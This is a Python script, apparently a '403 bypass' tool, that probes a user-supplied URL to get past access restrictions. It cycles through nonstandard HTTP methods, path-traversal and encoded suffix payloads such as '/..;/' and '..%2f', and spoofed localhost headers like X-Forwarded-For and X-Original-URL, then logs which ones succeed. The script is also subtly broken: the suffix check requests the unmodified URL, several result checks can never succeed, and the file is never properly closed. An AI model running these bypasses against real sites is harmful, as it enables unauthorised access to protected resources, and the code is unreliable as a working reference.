#!/usr/bin/python3
from urllib import request, error
import requests, os
from socket import timeout

postf = 'N'
urlchf = 'N'
headerf = 'N'
url = 'https://example.com'
workingsuffix = '''
Working Suffix Payloads:

'''
workingmethods = '''
Working HTTP Methods

'''
workingheaders = '''
Working Headers

'''
def print_succesful():
    global workingheaders
    global workingmethods
    global workingsuffix
    print(workingsuffix)
    print('------------------------')
    print(workingmethods)
    print('------------------------')
    print(workingheaders)
def banner(choice,fsn):
    global postf
    global urlchf
    global headerf
    global workingheaders
    global workingmethods
    global workingsuffix
    global url
    if choice == 0:
        pass
    elif choice == 99:
        postf = 'N'
        urlchf = 'N'
        headerf = 'N'
        workingsuffix = '''Working Suffix Payloads:

'''
        workingmethods = '''Working HTTP Methods

'''
        workingheaders = '''Working Headers

'''
    elif choice == 1:
        postf = fsn
    elif choice == 2:
        urlchf = fsn
    elif choice == 3:
        headerf = fsn
    
    banner = f"""
     _  _    ___ _____ _                                
    | || |  / _ \___ /| |__  _   _ _ __   __ _ ___ ___  
    | || |_| | | ||_ \| '_ \| | | | '_ \ / _` / __/ __| 
    |__   _| |_| |__) | |_) | |_| | |_) | (_| \__ \__ \ 
       |_|  \___/____/|_.__/ \__, | .__/ \__,_|___/___/ 
                             |___/|_|                   
    URL: {url}
    [0] Test All Bypasses                 
    [1][{postf}] Requests Method Bypass
    [2][{urlchf}] Url Modding Bypasses
    [3][{headerf}] Header Injections
    [96] Output To A File
    [97] View Working Bypasses
    [98] Change URL
    [99] Exit
    """
    return banner
def askurl():
    global url
    url = input("Input the URL -> ")
    url = url.strip()
    if url.find('http') == -1:
        http = input('[1] http\n[2] https\nChoose-> ')
        if http == '1':
            url = 'http://' + url
        elif http == '2':
            url = 'https://' + url
        else:
            exit()
    banner(99, '')
    return url
def main():
    global workingmethods
    global workingsuffix
    global workingheaders
    global url
    while True:
        print(banner(0 ,0))
        if url == '':
            askurl()
        else:
            pass
        ch = input("Method -> ")
        if ch == '99':
            exit()
        elif ch == '98':
            url = askurl()
        elif ch == '97':
            print_succesful()
        elif ch == '96':
            output()
        elif ch == '0':
            types()
            suffix()
            header_injection()
        elif ch == '1':
            types()
        elif ch == '2':
            suffix()
        elif ch == '3':
            header_injection()
        os.system("read -r -p \"Press any key to continue...\" key")
        os.system("clear")
def getrequest(url):
    r = requests.get(url)
    return r.status_code
def types():
    global url
    global workingmethods
    methods = ['GET', 'POST', 'PUT', 'CONNECT', 'COPY', 'PATCH', 'TRACE', 'HEAD', 'UPDATE', 'LABEL', 'OPTIONS', 'MOVE', 'SEARCH', 'ARBITRARY', 'CHECKOUT', 'UNCHECKOUT', 'UNLOCK', 'MERGE', 'BASELINE-CONTROL', 'ACL' ]
    for method in methods:
        try:
            req = request.Request(url, method=method)
            r = request.urlopen(req, timeout = 10)
            code = r.getcode()
        except timeout:
            #print(f'{method} Method Timed Out')
            code = 'Timeout Error'
            pass
        except error.HTTPError:
            #print(f'{method} Method Probably Not Accepted')
            code = 'Error'
            pass
        print(method + ' -> ' + str(code))
        if code == 200 or code == 201:
            workingmethods = workingmethods + method + '\n'
        else:
            pass
        if workingmethods == '':
            banner(1, 'F')
        else:
            banner(1, 'S')
def suffix():
    global url
    global workingsuffix
    #Directory Based Bypasses
    payloads = ["/","/*","/%2f/","/./","./.","/*/","?","??","&","#","%","%20","%09","/..;/","../","..%2f","..;/",".././","..%00/","..%0d","..%5c","..%ff/","%2e%2e%2f",".%2e/","%3f","%26","%23",".json"]
    for payload in payloads:
        urlch = url + payload
        code = getrequest(url)
        if code == 200 or code == 201:
            workingsuffix = workingsuffix + urlch + '\n'
        else:
            pass
        print(urlch + ' -> ' + str(getrequest(url)))
    if workingsuffix == '':
        banner(2, 'F')
    else:
        banner(2, 'S')

def header_injection():
    global workingheaders
    global url
    headers = [{'X-Forwarded-For':'127.0.0.1'}, {'X-Forwarded-Host':'127.0.0.1'}, {'X-Host':'127.0.0.1'}, {'X-Custom-IP-Authorization':'127.0.0.1'}, {'X-Original-URL':'127.0.0.1'}, {'X-Originating-IP':'127.0.0.1'}, {'X-Remote-IP':'127.0.0.1'}]
    for header in headers:
        r = requests.get(url, headers = header)
        if r.status_code == 200 or r.status_code == 201:
            workingheaders = workingheaders + str(header) + '\n'
        else:
            pass
        print(str(header) + ' -> ' + str(r.status_code))
    if workingheaders == '':
        banner(3, 'F')
    else:
        banner(3, 'S')


def output():
    global workingheaders
    global workingmethods
    global workingsuffix
    f = open('results.txt', 'w')
    content = workingmethods + '\n----------------------------\n\n' + workingsuffix + '\n----------------------------\n\n' + workingheaders
    f.write(content)
    f.close
if __name__ == "__main__":
    main()